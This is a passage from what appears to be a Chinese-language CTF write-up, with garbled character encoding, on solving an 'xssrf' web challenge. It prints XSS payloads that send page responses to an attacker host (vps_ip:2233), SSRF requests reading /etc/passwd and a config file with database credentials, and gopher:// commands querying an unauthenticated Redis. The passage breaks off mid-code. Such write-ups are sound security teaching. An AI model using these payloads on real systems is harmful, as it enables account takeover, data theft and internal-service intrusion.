srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426145140680"></p><p>æŠŠè¿™ä¸€ä¸² base64è§£ç ä¸€ä¸‹ï¼Œæå–å…³é”®ä¿¡æ¯ï¼Œå‘ç°ä¸»è¦å¤šäº† Set Admin å’Œ Send Request ä¸¤ä¸ªåŠŸèƒ½ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;navbar-nav&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;sendmail.php&quot;</span>&gt;</span>Send Mail<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mailbox.php&quot;</span>&gt;</span>Mailbox<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;sentmail.php&quot;</span>&gt;</span>Sent Mail<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;setadmin.php&quot;</span>&gt;</span>Set Admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;request.php&quot;</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ AJAX è¯·æ±‚åˆ†åˆ«è¯·æ±‚ä¸€ä¸‹ <code>setadmin.php</code> å’Œ <code>request.php</code> çœ‹çœ‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>ä¸€æ ·HTMLç¼–ç ä¸€ä¸‹åŒå¼•å·é‡Œé¢çš„éƒ¨åˆ†ï¼ŒåŒæ ·åœ¨å¯¼èˆªæ  <code>Send Mail</code> éƒ¨åˆ†å‘é€</p><p><img src="/img/xssrf/image-20210426144401815.png" class="lazyload" data-srcset="/img/xssrf/image-20210426144401815.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426144401815"></p><p>base64è§£ç æå–å…³é”®éƒ¨åˆ†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/request.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;url&quot;</span>&gt;</span>URL<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span> <span class="attr">aria-describedby</span>=<span class="string">&quot;url&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;URL&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ <code>setadmin.php</code> åŒæ ·ï¼Œç»“æœ base64è§£ç  æå–å…³é”®éƒ¨åˆ†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/setadmin.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">aria-describedby</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Give Admin Access<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯•è¯•èƒ½ä¸èƒ½é€šè¿‡ <code>setadmin.php</code> è®¾ç½®ç®¡ç†å‘˜ï¼Œä¹‹åæ“ä½œä¹Ÿæ–¹å¼ä¸€ç‚¹ç‚¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;username=tari&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿”å›ä¿¡æ¯â€¦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-warning&quot;</span>&gt;</span>This user is already a admin.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ç»§ç»­é€šè¿‡è¿™ç§æ–¹å¼è·å–åˆ©ç”¨ <code>request.php</code> å§ï¼Œå­˜åœ¨ SSRF</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///etc/passwd&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>è¯»äº†ä¸€ä¸‹ /etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:104:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:105:107::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:106:108:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">redis:x:107:110::&#x2F;var&#x2F;lib&#x2F;redis:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>å‘ç° www-data è§£æç›®å½•ä¸º /var/www å¹¶ä¸”æœ‰ redis ç”¨æˆ·</p><p>å°è¯•äº† <code>/proc/self/environ</code> å’Œ <code>/proc/self/cmdline</code> éƒ½æ— æ³•è·å–å‡†ç¡®çš„ web æ ¹ç›®å½•ï¼Œåªèƒ½çŒœäº†ï¼Œæ¯”å¦‚ /var/www/html ï¼ˆ</p><p>è¯»å–ä¸€ä¸‹æ‰«æç›®å½•å‘ç°çš„ <code>config.php</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>è§£ç ä¸€ä¸‹å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// database config</span></span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;xssrf&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASS&#x27;</span>, <span class="string">&#x27;xssrfmeplz&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;host=localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;xssrf&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// redis config</span></span><br><span class="line">define(<span class="string">&#x27;REDIS_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;REDIS_PORT&#x27;</span>, <span class="number">25566</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// define flag</span></span><br><span class="line">define(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c_hardness</span> = <span class="number">5</span>; <span class="comment">// how many proof of work leading zeros</span></span><br></pre></td></tr></table></figure><p>ç¬¬ 2 ä¸ª flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;curl -v -o flag --next flag:&#x2F;&#x2F;in-the.redis&#x2F;the?port&#x3D;25566&amp;good&#x3D;luck&#125;</span><br></pre></td></tr></table></figure><p>è¯´å¥½çš„ç¬¬ 2 ä¸ª flag åœ¨ redis é‡Œå‘¢â€¦</p><h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h2><p>ä¸Šä¸€ä¸ª flag æç¤º redis ç«¯å£åœ¨ <code>25566</code></p><p>å…ˆè¯•è¯• gopher åè®® æœªæˆæƒæ‰“ redis</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>redisç¯å¢ƒä¿¡æ¯è¢«æ„‰å¿«çš„æ‰“å°å‡ºæ¥</p><p><img src="/img/xssrf/image-20210426153402679.png" class="lazyload" data-srcset="/img/xssrf/image-20210426153402679.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426153402679"></p><p>ä¾æ¬¡è·å– redis çš„é”®å’Œå€¼å³å¯</p><ul><li>è·å–æ‰€æœ‰é”®</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(<span class="string">&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¯»å–ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1</span><br><span class="line"></span><br><span class="line">$4</span><br><span class="line"></span><br><span class="line">flag</span><br></pre></td></tr></table></figure><ul><li>åˆ¤æ–­flagé”®çš„å€¼ç±»å‹</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a&quot;);</span><br></pre></td></tr></table></figure><p>è¯»å–ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+list</span><br></pre></td></tr></table></figure><ul><li>è·å–flagé”®çš„æ‰€æœ‰åˆ—è¡¨å€¼</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%2520-1%250a&quot;);</span><br></pre></td></tr></table></figure><p>æŠŠç»“æœå¤åˆ¶è¿›å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">*53</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 